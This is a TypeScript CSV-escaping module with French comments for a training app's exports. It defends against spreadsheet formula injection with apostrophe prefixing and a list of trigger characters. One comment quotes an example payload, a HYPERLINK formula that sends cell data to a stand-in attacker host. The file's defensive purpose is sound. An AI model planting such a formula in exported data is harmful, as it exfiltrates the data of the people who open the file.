// Echappement CSV commun aux exports (bilans quotidiens, carnet
// d'entrainement).
//
// Deux problemes distincts, souvent confondus :
//
// 1. Echappement CSV a proprement parler : une virgule, un guillemet ou un
//    retour a la ligne dans une valeur casse la structure du fichier si la
//    valeur n'est pas entouree de guillemets (et les guillemets doubles).
//
// 2. Injection de formule (CSV/Excel injection) : Excel, LibreOffice et Google
//    Sheets interpretent toute cellule commencant par "=", "+", "-" ou "@"
//    comme une FORMULE et non comme du texte. Un client qui nomme une seance
//    =HYPERLINK("http://pirate.tld?f="&A1,"Cliquez ici") transforme l'export
//    que son coach ouvre en exfiltration de donnees, voire en execution de
//    commande selon la configuration du tableur. Le remede standard (OWASP)
//    est de prefixer la valeur d'une apostrophe, qui force le tableur a la
//    traiter comme du texte. La tabulation et le retour chariot sont inclus :
//    ils permettent de faire glisser le contenu dans la cellule suivante.
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

export function csvEscape(v: string | number | null | undefined): string {
  if (v == null) return "";
  let s = String(v);

  if (FORMULA_TRIGGERS.some((c) => s.startsWith(c))) {
    s = `'${s}`;
  }

  return s.includes(",") || s.includes('"') || s.includes("\n") || s.includes("\r")
    ? `"${s.replace(/"/g, '""')}"`
    : s;
}

// Valeurs numeriques : les prefixer d'une apostrophe casserait les colonnes
// chiffrees du tableur. On verifie donc simplement que la valeur est bien un
// nombre ecrit en clair, et on la recopie telle quelle. Un nombre negatif
// commence par "-" mais ne peut pas etre une formule des lors que la chaine
// entiere est un litteral numerique.
//
// Recopie a l'identique et non String(Number(v)) : les colonnes numeric de
// Postgres arrivent en chaine ("80.00"), et les reformater ferait perdre les
// decimales affichees dans l'export.
const NUMERIC_LITERAL = /^-?\d+(\.\d+)?$/;

export function csvNumber(v: number | string | null | undefined): string {
  if (v == null) return "";
  const s = String(v);
  return NUMERIC_LITERAL.test(s) ? s : "";
}
